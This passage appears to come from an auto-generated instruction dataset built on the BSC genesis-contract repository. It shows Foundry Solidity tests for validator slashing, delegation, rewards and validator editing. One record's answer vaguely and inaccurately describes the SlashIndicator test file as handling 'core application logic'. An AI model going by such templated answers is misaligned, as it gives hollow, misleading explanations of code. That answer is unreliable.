               assertEq(0, count);\n            }\n        }\n\n        vm.stopPrank();\n    }\n\n    function testDoubleSignSlash() public {\n        // mock data\n        address mockValidator = 0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f;\n        bytes memory headerA =\n            hex\"f9030ca01062d3d5015b9242bc193a9b0769f3d3780ecb55f97f40a752ae26d0b68cd0d8a0fae1a05fcb14bfd9b8a9f2b65007a9b6c2000de0627a73be644dd993d32342c49423618e81e3f5cdf7f54c3d65f7fbc0abf5b21e8fa0f385cc58ed297ff0d66eb5580b02853d3478ba418b1819ac659ee05df49b9794a0bf88464af369ed6b8cf02db00f0b9556ffa8d49cd491b00952a7f83431446638a00a6d0870e586a76278fbfdcedf76ef6679af18fc1f9137cfad495f434974ea81b90100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000182013c830f4240830f424084658536fab90111da83010307846765746889676f312e32302e31318664617277696e0074159c05f8ae0eb860801d1e61afc5a1699481fd7571c3137c62099dd242c0b4b664c1d809136ab1440daa3f50ce6ed9403bc224f1ec2d1e8b093d10c1d0b10b03389d98b8c5fde5b4691c83166df0af32924c48b22eb60102e25b6c4055c66906c4df9d3ada9d1b73f84882013ba096e06042bbde89e3f2ef11866185c956e960f3288ddab992c418bb59c3b9ee5c82013ca0c32c37a3f15126f6a7b17e865a87156ae0ac40affb4e2b7b4ac90b836f8c59ae8074a3507c03946289530039298849a5940ad431ec66f96ffd7437827f8eeab9087dc18da3164374f42f1e3c6bebe554716130bd31492a03c993fee78c456ce94301a0232c9ba2d41b40d36ed794c306747bcbc49bf61a0f37409c18bfe2b5bef26a2d880000000000000000\";\n        bytes memory headerB =\n            hex\"f9030ca01062d3d5015b9242bc193a9b0769f3d3780ecb55f97f40a752ae26d0b68cd0d8a0b2789a5357827ed838335283e15c4dcc42b9bebcbf2919a18613246787e2f9609423618e81e3f5cdf7f54c3d65f7fbc0abf5b21e8fa071ce4c09ee275206013f0063761bc19c93c13990582f918cc57333634c94ce89a00e095703e5c9b149f253fe89697230029e32484a410b4b1f2c61442d73c3095aa0d317ae19ede7c8a2d3ac9ef98735b049bcb7278d12f48c42b924538b60a25e12b90100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000182013c830f4240830f424084658536fab90111da83010307846765746889676f312e32302e31318664617277696e0074159c05f8ae0eb860801d1e61afc5a1699481fd7571c3137c62099dd242c0b4b664c1d809136ab1440daa3f50ce6ed9403bc224f1ec2d1e8b093d10c1d0b10b03389d98b8c5fde5b4691c83166df0af32924c48b22eb60102e25b6c4055c66906c4df9d3ada9d1b73f84882013ba096e06042bbde89e3f2ef11866185c956e960f3288ddab992c418bb59c3b9ee5c82013ca0c32c37a3f15126f6a7b17e865a87156ae0ac40affb4e2b7b4ac90b836f8c59ae80926cf08f6dbbabef4df538d004feff0a6f7363bf2a0a71c805f08444e83da4eb2aeecbf9efe11da04cf537cd33d3cd5b0148401c9da5f8bd45af3b6169bace7501a0b56228685be711834d0f154292d07826dea42a0fad3e4f56c31470b7fbfbea26880000000000000000\";\n\n        uint256 mockEvidenceHeight = block.number - 1;\n        bytes memory mockOutput = bytes.concat(abi.encodePacked(mockValidator), abi.encodePacked(mockEvidenceHeight));\n        vm.mockCall(address(0x68), bytes(\"\"), mockOutput);\n        vm.mockCall(\n            address(stakeHub), abi.encodeCall(stakeHub.consensusToOperator, (mockValidator)), abi.encode(mockValidator)\n        );\n\n        vm.prank(relayer);\n        vm.expectRevert(StakeHub.ValidatorNotExisted.selector);\n        slashIndicator.submitDoubleSignEvidence(headerA, headerB);\n    }\n\n    function testMaliciousVoteSlash() public {\n        if (!slashIndicator.enableMaliciousVoteSlash()) {\n            bytes memory key = \"enableMaliciousVoteSlash\";\n            bytes memory value = bytes(hex\"0000000000000000000000000000000000000000000000000000000000000001\");\n            _updateParamByGovHub(key, value, address(slashIndicator));\n        }\n\n        (\n            address[] memory operatorAddrs,\n            address[] memory consensusAddrs,\n            uint64[] memory votingPowers,\n            bytes[] memory voteAddrs\n        ) = _batchCreateValidators(20);\n        vm.prank(coinbase);\n        bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n\n        // case1: valid finality evidence: same target block\n        uint256 srcNumA = block.number - 20;\n        uint256 tarNumA = block.number - 10;\n        uint256 srcNumB = block.number - 15;\n        uint256 tarNumB = tarNumA;\n        SlashIndicator.VoteData memory voteA;\n        voteA.srcNum = srcNumA;\n        voteA.srcHash = blockhash(srcNumA);\n        voteA.tarNum = tarNumA;\n        voteA.tarHash = blockhash(tarNumA);\n        voteA.sig =\n            hex\"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001\";\n\n        SlashIndicator.VoteData memory voteB;\n        voteB.srcNum = srcNumB;\n        voteB.srcHash = blockhash(srcNumB);\n        voteB.tarNum = tarNumB;\n        voteB.tarHash = blockhash(tarNumB);\n        voteB.sig =\n            hex\"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002\";\n\n        SlashIndicator.FinalityEvidence memory evidence;\n        evidence.voteA = voteA;\n        evidence.voteB = voteB;\n        evidence.voteAddr = voteAddrs[0];\n\n        vm.expectEmit(true, false, false, false, address(stakeHub));\n        emit ValidatorSlashed(operatorAddrs[0], 0, 0, 2); // only check operator address\n        vm.prank(relayer);\n        slashIndicator.submitFinalityViolationEvidence(evidence);\n    }\n\n    function _calcIncoming(uint256 value) internal view returns (uint256 incoming) {\n        uint256 turnLength = bscValidatorSet.getTurnLength();\n        uint256 systemRewardAntiMEVRatio = bscValidatorSet.systemRewardAntiMEVRatio();\n        uint256 systemRewardRatio = systemRewardBaseRatio;\n        if (turnLength > 1 && systemRewardAntiMEVRatio > 0) {\n            systemRewardRatio += systemRewardAntiMEVRatio * (block.number % turnLength) / (turnLength - 1);\n        }\n        uint256 toSystemReward = (value * systemRewardBaseRatio) / systemRewardRatioScale;\n        uint256 toBurn = (value * burnRatio) / burnRatioScale;\n        incoming = value - toSystemReward - toBurn;\n    }\n}\n\n```"}
{"instruction": "What does the file SlashIndicator.t.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\nimport \"./utils/Deployer.sol\";\n\ncontract SlashIndicatorTest is Deployer {\n    event validatorSlashed(address indexed validator0);\n    event ValidatorSlashed(address indexed operatorAddress, uint256 jailUntil, uint256 slashAmount, uint8 slashType);\n\n    uint256 public burnRatio;\n    uint256 public burnRatioScale;\n    uint256 public systemRewardBaseRatio;\n    uint256 public systemRewardRatioScale;\n\n    address public coinbase;\n    address public validator0;\n    address public validatorLast;\n\n    uint256 public constant MISDEMEANOR_THRESHOLD = 200;\n    uint256 public constant FELONY_THRESHOLD = 600;\n\n    function setUp() public {\n        burnRatio =\n            bscValidatorSet.isSystemRewardIncluded() ? bscValidatorSet.burnRatio() : bscValidatorSet.INIT_BURN_RATIO();\n        burnRatioScale = bscValidatorSet.BLOCK_FEES_RATIO_SCALE();\n\n        systemRewardBaseRatio = bscValidatorSet.isSystemRewardIncluded()\n            ? bscValidatorSet.systemRewardBaseRatio()\n            : bscValidatorSet.INIT_SYSTEM_REWARD_RATIO();\n        systemRewardRatioScale = bscValidatorSet.BLOCK_FEES_RATIO_SCALE();\n\n        address[] memory validators = bscValidatorSet.getValidators();\n        validator0 = validators[0];\n        validatorLast = validators[validators.length - 1];\n\n        coinbase = block.coinbase;\n        vm.deal(coinbase, 100 ether);\n\n        // set gas price to zero to send system slash tx\n        vm.txGasPrice(0);\n        vm.mockCall(address(0x66), bytes(\"\"), hex\"01\");\n    }\n\n    function testGov() public {\n        bytes memory key = \"misdemeanorThreshold\";\n        bytes memory value = bytes(hex\"0000000000000000000000000000000000000000000000000000000000000064\"); // 100\n        _updateParamByGovHub(key, value, address(slashIndicator));\n        assertEq(slashIndicator.misdemeanorThreshold(), 100);\n\n        key = \"felonyThreshold\";\n        value = bytes(hex\"00000000000000000000000000000000000000000000000000000000000000c8\"); // 200\n        _updateParamBy\n```", "output": "This file `SlashIndicator.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StakeHub.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\StakeHub.t.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\nimport \"forge-std/console.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\nimport \"./utils/Deployer.sol\";\n\ninterface IStakeCredit {\n    function balanceOf(address account) external view returns (uint256);\n    function totalPooledBNB() external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function getPooledBNBByShares(uint256 shares) external view returns (uint256);\n    function getSharesByPooledBNB(uint256 bnbAmount) external view returns (uint256);\n}\n\ncontract StakeHubTest is Deployer {\n    using RLPEncode for *;\n\n    // Add NodeID related events and errors\n    event NodeIDAdded(address indexed validator, bytes32 nodeID);\n    event NodeIDRemoved(address indexed validator, bytes32 nodeID);\n    \n    error ExceedsMaxNodeIDs();\n    error DuplicateNodeID();\n    error InvalidNodeID();\n\n    event ConsensusAddressEdited(address indexed operatorAddress, address indexed newAddress);\n    event CommissionRateEdited(address indexed operatorAddress, uint64 commissionRate);\n    event DescriptionEdited(address indexed operatorAddress);\n    event VoteAddressEdited(address indexed operatorAddress, bytes newVoteAddress);\n    event RewardDistributed(address indexed operatorAddress, uint256 reward);\n    event ValidatorSlashed(address indexed operatorAddress, uint256 jailUntil, uint256 slashAmount, uint8 slashType);\n    event ValidatorUnjailed(address indexed operatorAddress);\n    event Claimed(address indexed operatorAddress, address indexed delegator, uint256 bnbAmount);\n    event MigrateSuccess(address indexed operatorAddress, address indexed delegator, uint256 shares, uint256 bnbAmount);\n    event MigrateFailed(\n        address indexed operatorAddress, address indexed delegator, uint256 bnbAmount, StakeMigrationRespCode respCode\n    );\n    event AgentChanged(address indexed operatorAddress, address indexed oldAgent, address indexed newAgent);\n\n    enum StakeMigrationRespCode {\n        MIGRATE_SUCCESS,\n        CLAIM_FUND_FAILED,\n        VALIDATOR_NOT_EXISTED,\n        VALIDATOR_JAILED\n    }\n\n    receive() external payable { }\n\n    function setUp() public {\n        vm.mockCall(address(0x66), bytes(\"\"), hex\"01\");\n    }\n\n    function testCreateValidator() public {\n        // create validator success\n        (address validator,,,) = _createValidator(2000 ether);\n        address consensusAddress = stakeHub.getValidatorConsensusAddress(validator);\n        bytes memory voteAddress = stakeHub.getValidatorVoteAddress(validator);\n\n        address operatorAddress = _getNextUserAddress();\n        vm.startPrank(operatorAddress);\n\n        // create failed with duplicate consensus address\n        uint256 delegation = 2000 ether;\n        uint256 toLock = stakeHub.LOCK_AMOUNT();\n        StakeHub.Commission memory commission = StakeHub.Commission({ rate: 10, maxRate: 100, maxChangeRate: 5 });\n        StakeHub.Description memory description = StakeHub.Description({\n            moniker: string.concat(\"T\", vm.toString(uint24(uint160(operatorAddress)))),\n            identity: vm.toString(operatorAddress),\n            website: vm.toString(operatorAddress),\n            details: vm.toString(operatorAddress)\n        });\n        bytes memory blsPubKey = bytes.concat(\n            hex\"00000000000000000000000000000000000000000000000000000000\", abi.encodePacked(operatorAddress)\n        );\n        bytes memory blsProof = new bytes(96);\n\n        vm.expectRevert(StakeHub.DuplicateConsensusAddress.selector);\n        stakeHub.createValidator{ value: delegation + toLock }(\n            consensusAddress, blsPubKey, blsProof, commission, description\n        );\n\n        // create failed with duplicate vote address\n        consensusAddress = address(uint160(uint256(keccak256(blsPubKey))));\n        vm.expectRevert(StakeHub.DuplicateVoteAddress.selector);\n        stakeHub.createValidator{ value: delegation + toLock }(\n            consensusAddress, voteAddress, blsProof, commission, description\n        );\n\n        // create failed with duplicate moniker\n        description = stakeHub.getValidatorDescription(validator);\n        vm.expectRevert(StakeHub.DuplicateMoniker.selector);\n        stakeHub.createValidator{ value: delegation + toLock }(\n            consensusAddress, blsPubKey, blsProof, commission, description\n        );\n    }\n\n    function testEditValidator() public {\n        // create validator\n        (address validator,,,) = _createValidator(2000 ether);\n        vm.startPrank(validator);\n\n        // edit failed because of `UpdateTooFrequently`\n        vm.expectRevert(StakeHub.UpdateTooFrequently.selector);\n        stakeHub.editConsensusAddress(address(1));\n\n        // edit consensus address\n        vm.warp(block.timestamp + 1 days);\n        address newConsensusAddress = address(0x1234);\n        vm.expectEmit(true, true, false, true, address(stakeHub));\n        emit ConsensusAddressEdited(validator, newConsensusAddress);\n        stakeHub.editConsensusAddress(newConsensusAddress);\n        address realConsensusAddr = stakeHub.getValidatorConsensusAddress(validator);\n        assertEq(realConsensusAddr, newConsensusAddress);\n\n        // edit commission rate\n        vm.warp(block.timestamp + 1 days);\n        vm.expectRevert(StakeHub.InvalidCommission.selector);\n        stakeHub.editCommissionRate(110);\n        vm.expectRevert(StakeHub.InvalidCommission.selector);\n        stakeHub.editCommissionRate(16);\n        vm.expectEmit(true, false, false, true, address(stakeHub));\n        emit CommissionRateEdited(validator, 15);\n        stakeHub.editCommissionRate(15);\n        StakeHub.Commission memory realComm = stakeHub.getValidatorCommission(validator);\n        assertEq(realComm.rate, 15);\n\n        // edit description\n        vm.warp(block.timestamp + 1 days);\n        StakeHub.Description memory description = stakeHub.getValidatorDescription(validator);\n        description.moniker = \"Test\";\n        description.website = \"Test\";\n        vm.expectEmit(true, false, false, true, address(stakeHub));\n        emit DescriptionEdited(validator);\n        stakeHub.editDescription(description);\n        StakeHub.Description memory realDesc = stakeHub.getValidatorDescription(validator);\n        assertNotEq(realDesc.moniker, \"Test\"); // edit moniker will be ignored\n        assertEq(realDesc.website, \"Test\");\n\n        // edit vote address\n        vm.warp(block.timestamp + 1 days);\n        bytes memory newVoteAddress =\n            hex\"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001234\";\n        bytes memory blsProof = new bytes(96);\n        vm.expectEmit(true, false, false, true, address(stakeHub));\n        emit VoteAddressEdited(validator, newVoteAddress);\n        stakeHub.editVoteAddress(newVoteAddress, blsProof);\n        bytes memory realVoteAddr = stakeHub.getValidatorVoteAddress(validator);\n        assertEq(realVoteAddr, newVoteAddress);\n\n        vm.stopPrank();\n    }\n\n    function testDelegate() public {\n        address delegator = _getNextUserAddress();\n        (address validator,, address credit,) = _createValidator(2000 ether);\n        vm.startPrank(delegator);\n\n        // failed with too small delegation amount\n        vm.expectRevert(StakeHub.DelegationAmountTooSmall.selector);\n        stakeHub.delegate{ value: 1 }(validator, false);\n\n        // success case\n        uint256 bnbAmount = 100 ether;\n        stakeHub.delegate{ value: bnbAmount }(validator, false);\n        uint256 shares = IStakeCredit(credit).balanceOf(delegator);\n        assertEq(shares, bnbAmount);\n        uint256 pooledBNB = IStakeCredit(credit).getPooledBNBByShares(shares);\n        assertEq(pooledBNB, bnbAmount);\n\n        vm.stopPrank();\n    }\n\n    function testUndelegate() public {\n        address delegator = _getNextUserAddress();\n        (address validator,, address credit,) = _createValidator(2000 ether);\n        vm.startPrank(delegator);\n\n        uint256 bnbAmount = 100 ether;\n        stakeHub.delegate{ value: bnbAmount }(validator, false);\n        uint256 shares = IStakeCredit(credit).balanceOf(delegator);\n\n        // failed with not enough shares\n        vm.expectRevert(StakeCredit.InsufficientBalance.selector);\n        stakeHub.undelegate(validator, shares + 1);\n\n        // success case\n        stakeHub.undelegate(validator, shares / 2);\n\n        // claim failed\n        vm.expectRevert(StakeCredit.NoClaimableUnbondRequest.selector);\n        stakeHub.claim(validator, 0);\n\n        // claim success\n        vm.warp(block.timestamp + 7 days);\n        uint256 balanceBefore = delegator.balance;\n        vm.expectEmit(true, true, false, true, address(stakeHub));\n        emit Claimed(validator, delegator, bnbAmount / 2);\n        stakeHub.claim(validator, 0);\n        uint256 balanceAfter = delegator.balance;\n        assertEq(balanceAfter - balanceBefore, bnbAmount / 2);\n\n        vm.stopPrank();\n    }\n\n    function testUndelegateAll() public {\n        uint256 selfDelegation = 2000 ether;\n        uint256 toLock = stakeHub.LOCK_AMOUNT();\n        (address validator,, address credit,) = _createValidator(selfDelegation);\n        uint256 _totalShares = IStakeCredit(credit).totalSupply();\n        assertEq(_totalShares, selfDelegation + toLock, \"wrong total shares\");\n        uint256 _totalPooledBNB = IStakeCredit(credit).totalPooledBNB();\n        assertEq(_totalPooledBNB, selfDelegation + toLock, \"wrong total pooled BNB\");\n\n        vm.startPrank(validator);\n\n        // 1. undelegate all\n        stakeHub.undelegate(validator, selfDelegation);\n        _totalShares = IStakeCredit(credit).totalSupply();\n        assertEq(_totalShares, toLock, \"wrong total shares\");\n        _totalPooledBNB = IStakeCredit(credit).totalPooledBNB();\n        assertEq(_totalPooledBNB, toLock, \"wrong total pooled BNB\");\n\n        // 2. delegate again\n        stakeHub.delegate{ value: selfDelegation }(validator, false);\n        _totalShares = IStakeCredit(credit).totalSupply();\n        assertEq(_totalShares, selfDelegation + toLock, \"wrong total shares\");\n        _totalPooledBNB = IStakeCredit(credit).totalPooledBNB();\n        assertEq(_totalPooledBNB, selfDelegation + toLock, \"wrong total pooled BNB\");\n\n        vm.stopPrank();\n    }\n\n    function testRedelegate() public {\n        address delegator = _getNextUserAddress();\n        (address validator1,, address credit1,) = _createValidator(2000 ether);\n        (address validator2,, address credit2,) = _createValidator(2000 ether);\n        vm.startPrank(delegator);\n\n        uint256 bnbAmount = 100 ether;\n        stakeHub.delegate{ value: bnbAmount }(validator1, false);\n        uint256 oldShares = IStakeCredit(credit1).balanceOf(delegator);\n\n        // failed with too small redelegation amount\n        vm.expectRevert(StakeHub.DelegationAmountTooSmall.selector);\n        stakeHub.redelegate(validator1, validator2, 1, false);\n\n        // failed with not enough shares\n        vm.expectRevert(StakeCredit.InsufficientBalance.selector);\n        stakeHub.redelegate(validator1, validator2, oldShares + 1, false);\n\n        // success case\n        uint256 redelegateFeeRate = stakeHub.redelegateFeeRate();\n        uint256 feeBase = stakeHub.REDELEGATE_FEE_RATE_BASE();\n        uint256 redelegateFee = bnbAmount * redelegateFeeRate / feeBase;\n        uint256 expectedShares = (bnbAmount - redelegateFee) * IStakeCredit(credit2).totalSupply()\n            / (IStakeCredit(credit2).totalPooledBNB() + redelegateFee);\n        stakeHub.redelegate(validator1, validator2, oldShares, false);\n        uint256 newShares = IStakeCredit(credit2).balanceOf(delegator);\n        assertEq(newShares, expectedShares);\n\n        vm.stopPrank();\n\n        // self redelegate failed because of `SelfDelegationNotEnough`\n        uint256 selfDelegation = 2000 ether;\n        vm.expectRevert(StakeHub.SelfDelegationNotEnough.selector);\n        vm.prank(validator1);\n        stakeHub.redelegate(validator1, validator2, selfDelegation, false);\n    }\n\n    function testReceiveBNB() public {\n        // send to stakeHub directly\n        (bool success,) = address(stakeHub).call{ value: 1 ether }(\"\");\n        assertTrue(!success);\n        (success,) = address(stakeHub).call{ value: 1 ether }(hex\"12\");\n        assertTrue(!success);\n\n        // send to credit contract directly\n        (,, address credit,) = _createValidator(2000 ether);\n        (success,) = credit.call{ value: 1 ether }(\"\");\n        assertTrue(!success);\n        (success,) = credit.call{ value: 1 ether }(hex\"12\");\n        assertTrue(!success);\n\n        // send to credit contract by stakeHub\n        vm.deal(address(stakeHub), 1 ether);\n        vm.prank(address(stakeHub));\n        (success,) = credit.call{ value: 1 ether }(\"\");\n        assertTrue(success);\n    }\n\n    function testDistributeReward() public {\n        address delegator = _getNextUserAddress();\n        uint256 selfDelegation = 2000 ether;\n        (address validator,, address credit,) = _createValidator(selfDelegation);\n\n        // 1. delegate 100 BNB and get 100 * 1e18 shares\n        uint256 delegation = 100 ether;\n        vm.prank(delegator);\n        stakeHub.delegate{ value: delegation }(validator, false);\n        uint256 shares = IStakeCredit(credit).balanceOf(delegator);\n        assertEq(shares, delegation);\n\n        // 2. distribute reward\n        uint256 reward = 100 ether;\n        address consensusAddress = stakeHub.getValidatorConsensusAddress(validator);\n        vm.expectEmit(true, true, false, true, address(stakeHub));\n        emit RewardDistributed(validator, reward);\n        vm.deal(VALIDATOR_CONTRACT_ADDR, VALIDATOR_CONTRACT_ADDR.balance + reward);\n        vm.prank(VALIDATOR_CONTRACT_ADDR);\n        stakeHub.distributeReward{ value: reward }(consensusAddress);\n\n        // 3. check shares\n        // reward: 100 ether\n        // commissionToValidator: reward(100 ether) * commissionRate(10/10000) = 0.1 ether\n        // preTotalPooledBNB: locked amount(1 ether) + selfDelegation(2000 ether) + delegation(100 ether) + (reward - commissionToValidator)(99.9 ether) = 2200.9 ether\n        // preTotalShares: locked shares(1 ether) + selfDelegation(2000 ether) + delegation(100 ether)\n        // curTotalShares: preTotalShares + commissionToValidator * preTotalShares  / preTotalPooledBNB = 2101095460947794084238\n        // curTotalPooledBNB: preTotalPooledBNB + commissionToValidator = 2201 ether\n        // expectedBnbAmount: shares(100 ether) * curTotalPooledBNB / curTotalShares\n        uint256 _totalShares = IStakeCredit(credit).totalSupply();\n        assertEq(_totalShares, 2101095460947794084238, \"wrong total shares\");\n        uint256 expectedBnbAmount = shares * 2201 ether / uint256(2101095460947794084238);\n        uint256 realBnbAmount = IStakeCredit(credit).getPooledBNBByShares(shares);\n        assertEq(realBnbAmount, expectedBnbAmount, \"wrong BNB amount\");\n\n        // 4. undelegate and submit new delegate\n        vm.prank(delegator);\n        stakeHub.undelegate(validator, shares);\n\n        // totalShares: 2101095460947794084238 - 100 ether = 2001095460947794084238\n        // totalPooledBNB: 2201 ether - (100 ether + 99.9 ether * 100 / 2101 ) = 2096245121370775821038\n        // newShares: 100 ether * totalShares / totalPooledBNB\n        uint256 _totalPooledBNB = IStakeCredit(credit).totalPooledBNB();\n        assertEq(_totalPooledBNB, 2096245121370775821038, \"wrong total pooled BNB\");\n        uint256 expectedShares = 100 ether * uint256(2001095460947794084238) / uint256(2096245121370775821038);\n        address newDelegator = _getNextUserAddress();\n        vm.prank(newDelegator);\n        stakeHub.delegate{ value: delegation }(validator, false);\n        uint256 newShares = IStakeCredit(credit).balanceOf(newDelegator);\n        assertEq(newShares, expectedShares, \"wrong new shares\");\n    }\n\n    function testDowntimeSlash() public {\n        // totalShares: 2100095458884494749761\n        // totalPooledBNB: 2200 ether\n        uint256 selfDelegation = 2000 ether;\n        uint256 reward = 100 ether;\n        (address validator,, address credit,) = _createValidator(selfDelegation);\n        _createValidator(selfDelegation); // create 2 validator to avoid empty jail\n\n        address delegator = _getNextUserAddress();\n        vm.prank(delegator);\n        stakeHub.delegate{ value: 100 ether }(validator, false);\n\n        address consensusAddress = stakeHub.getValidatorConsensusAddress(validator);\n        vm.deal(VALIDATOR_CONTRACT_ADDR, VALIDATOR_CONTRACT_ADDR.balance + reward);\n        vm.prank(VALIDATOR_CONTRACT_ADDR);\n        stakeHub.distributeReward{ value: reward }(consensusAddress);\n\n        uint256 preDelegatorBnbAmount =\n            IStakeCredit(credit).getPooledBNBByShares(IStakeCredit(credit).balanceOf(delegator));\n        uint256 preValidatorBnbAmount =\n            IStakeCredit(credit).getPooledBNBByShares(IStakeCredit(credit).balanceOf(validator));\n\n        vm.startPrank(SLASH_CONTRACT_ADDR);\n\n        // downtime slash type: 1\n        uint256 slashAmt = stakeHub.downtimeSlashAmount();\n        uint256 slashTime = stakeHub.downtimeJailTime();\n        vm.expectEmit(true, false, false, false, address(stakeHub));\n        emit ValidatorSlashed(validator, block.timestamp + slashTime, slashAmt, 1);\n        stakeHub.downtimeSlash(consensusAddress);\n        uint256 curValidatorBnbAmount =\n            IStakeCredit(credit).getPooledBNBByShares(IStakeCredit(credit).balanceOf(validator));\n        assertApproxEqAbs(preValidatorBnbAmount, curValidatorBnbAmount + slashAmt, 1); // there may be 1 delta due to the precision\n\n        // check delegator's share\n        uint256 curDelegatorBnbAmount =\n            IStakeCredit(credit).getPooledBNBByShares(IStakeCredit(credit).balanceOf(delegator));\n        assertApproxEqAbs(preDelegatorBnbAmount, curDelegatorBnbAmount, 1); // there may be 1 delta due to the precision\n\n        // unjail\n        (, bool jailed,) = stakeHub.getValidatorBasicInfo(validator);\n        assertEq(jailed, true);\n        vm.expectRevert();\n        stakeHub.unjail(validator);\n        vm.warp(block.timestamp + slashTime + 1);\n        vm.expectEmit(true, false, false, true, address(stakeHub));\n        emit ValidatorUnjailed(validator);\n        stakeHub.unjail(validator);\n        (, jailed,) = stakeHub.getValidatorBasicInfo(validator);\n        assertEq(jailed, false);\n\n        vm.stopPrank();\n    }\n\n    function testDoubleSignSlash() public {\n        // totalShares: 2100095458884494749761\n        // totalPooledBNB: 2200 ether\n        uint256 selfDelegation = 2000 ether;\n        uint256 reward = 100 ether;\n        (address validator,, address credit,) = _createValidator(selfDelegation);\n\n        address delegator = _getNextUserAddress();\n        vm.prank(delegator);\n        stakeHub.delegate{ value: 100 ether }(validator, false);\n\n        address consensusAddress = stakeHub.getValidatorConsensusAddress(validator);\n        vm.deal(VALIDATOR_CONTRACT_ADDR, VALIDATOR_CONTRACT_ADDR.balance + reward);\n        vm.prank(VALIDATOR_CONTRACT_ADDR);\n        stakeHub.distributeReward{ value: reward }(consensusAddress);\n\n        uint256 preDelegatorBnbAmount =\n            IStakeCredit(credit).getPooledBNBByShares(IStakeCredit(credit).balanceOf(delegator));\n\n        vm.startPrank(SLASH_CONTRACT_ADDR);\n\n        // double sign slash type: 0\n        vm.expectEmit(true, false, false, false, address(stakeHub)); // as slash amount may vary by 1, we don't check the event data\n        emit ValidatorSlashed(validator, 0, 0, 0);\n        stakeHub.doubleSignSlash(consensusAddress);\n\n        // check delegator's share\n        uint256 curDelegatorBnbAmount =\n            IStakeCredit(credit).getPooledBNBByShares(IStakeCredit(credit).balanceOf(delegator));\n        assertApproxEqAbs(preDelegatorBnbAmount, curDelegatorBnbAmount, 1); // there may be 1 delta due to the precision\n    }\n\n    function testMaliciousVoteSlash() public {\n        // totalShares: 2100095458884494749761\n        // totalPooledBNB: 2200 ether\n        uint256 selfDelegation = 2000 ether;\n        uint256 reward = 100 ether;\n        (address validator,, address credit,) = _createValidator(selfDelegation);\n\n        address delegator = _getNextUserAddress();\n        vm.prank(delegator);\n        stakeHub.delegate{ value: 100 ether }(validator, false);\n\n        address consensusAddress = stakeHub.getValidatorConsensusAddress(validator);\n        bytes memory voteAddr = stakeHub.getValidatorVoteAddress(validator);\n        vm.deal(VALIDATOR_CONTRACT_ADDR, VALIDATOR_CONTRACT_ADDR.balance + reward);\n        vm.prank(VALIDATOR_CONTRACT_ADDR);\n        stakeHub.distributeReward{ value: reward }(consensusAddress);\n\n        uint256 preDelegatorBnbAmount =\n            IStakeCredit(credit).getPooledBNBByShares(IStakeCredit(credit).balanceOf(delegator));\n\n        // malicious vote slash type: 2\n        vm.expectEmit(true, false, false, false, address(stakeHub)); // as slash amount may vary by 1, we don't check the event data\n        emit ValidatorSlashed(validator, 0, 0, 2);\n        vm.prank(SLASH_CONTRACT_ADDR);\n        stakeHub.maliciousVoteSlash(voteAddr);\n\n        // check delegator's share\n        uint256 curDelegatorBnbAmount =\n            IStakeCredit(credit).getPooledBNBByShares(IStakeCredit(credit).balanceOf(delegator));\n        assertApproxEqAbs(preDelegatorBnbAmount, curDelegatorBnbAmount, 1); // there may be 1 delta due to the precision\n    }\n\n    function testUpdateValidatorSetV2() public {\n        uint256 length = stakeHub.maxElectedValidators();\n        address[] memory newConsensusAddrs = new address[](length);\n        uint64[] memory newVotingPower = new uint64[](length);\n        bytes[] memory newVoteAddrs = new bytes[](length);\n        address operatorAddress;\n        address consensusAddress;\n        uint64 votingPower;\n        bytes memory voteAddress;\n        for (uint256 i; i < length; ++i) {\n            votingPower = (2000 + uint64(i) * 2 + 1) * 1e8;\n            (operatorAddress,,,) = _createValidator(uint256(votingPower) * 1e10);\n            consensusAddress = stakeHub.getValidatorConsensusAddress(operatorAddress);\n            voteAddress = stakeHub.getValidatorVoteAddress(operatorAddress);\n            newConsensusAddrs[length - i - 1] = consensusAddress;\n            newVotingPower[length - i - 1] = votingPower;\n            newVoteAddrs[length - i - 1] = voteAddress;\n        }\n        vm.prank(block.coinbase);\n        vm.txGasPrice(0);\n        bscValidatorSet.updateValidatorSetV2(newConsensusAddrs, newVotingPower, newVoteAddrs);\n    }\n\n    function testEncodeLegacyBytes() public {\n        address[] memory cAddresses = new address[](56);\n        bytes[] memory vAddresses = new bytes[](34);\n\n        cAddresses[0] = 0x295e26495CEF6F69dFA69911d9D8e4F3bBadB89B;\n        cAddresses[1] = 0x72b61c6014342d914470eC7aC2975bE345796c2b;\n        cAddresses[2] = 0x2465176C461AfB316ebc773C61fAEe85A6515DAA;\n        cAddresses[3] = 0x7AE2F5B9e386cd1B50A4550696D957cB4900f03a;\n        cAddresses[4] = 0xb4dd66D7c2C7E57F628210187192fb89d4b99dD4;\n        cAddresses[5] = 0xE9AE3261a475a27Bb1028f140bc2a7c843318afD;\n        cAddresses[6] = 0xee226379dB83CfFC681495730c11fDDE79BA4c0C;\n        cAddresses[7] = 0x3f349bBaFEc1551819B8be1EfEA2fC46cA749aA1;\n        cAddresses[8] = 0x8b6C8fd93d6F4CeA42Bbb345DBc6F0DFdb5bEc73;\n        cAddresses[9] = 0xEF0274E31810C9Df02F98FAFDe0f841F4E66a1Cd;\n        cAddresses[10] = 